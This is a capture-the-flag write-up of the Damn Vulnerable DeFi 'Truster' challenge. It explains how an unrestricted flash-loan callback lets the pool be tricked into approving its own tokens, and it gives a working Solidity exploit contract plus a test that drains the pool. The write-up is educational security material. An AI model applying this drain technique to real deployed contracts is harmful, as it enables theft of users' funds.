# Truster

## Challenge Overview

The `TrusterLenderPool` contract offers flash loans of DVT tokens for free. 

In a single transaction, rescue the 1 million DVT in the lending pool and send it to the recovery account.

## Vulnerability Analysis

The callback executed by `flashLoan` is unrestricted and originates from `TrusterLenderPool`. This allows an attacker to force the pool to approve its own DVT balance to an attacker-controlled address, enabling the full pool balance to be drained via `transferFrom`.

## Exploit Strategy

The exploit is executed by calling `flashLoan` with the DVT token as the external call `target` and supplying calldata that makes the pool execute `approve`.

`TrusterRecoverer` is used to execute the exploit and forward the drained funds to the recovery address.

```solidity
contract TrusterRecoverer {
    function recover(TrusterLenderPool pool, DamnValuableToken token, address recovery, uint256 amount) external {
        bytes memory callData = abi.encodeWithSelector(
            pool.flashLoan.selector,
            0,
            recovery,
            address(token),
            abi.encodeWithSelector(
                token.approve.selector,
                address(this),
                amount
            )
        );

        address(pool).call(callData);
        token.transferFrom(address(pool), recovery, amount);
    }
}
```

## Proof of Concept

```solidity
function test_truster() public checkSolvedByPlayer {
    TrusterRecoverer recoverer = new TrusterRecoverer();
    recoverer.recover(pool, token, recovery, TOKENS_IN_POOL);
}
```

## Result

The pool's DVT will be transfered out into the `recovery` address.
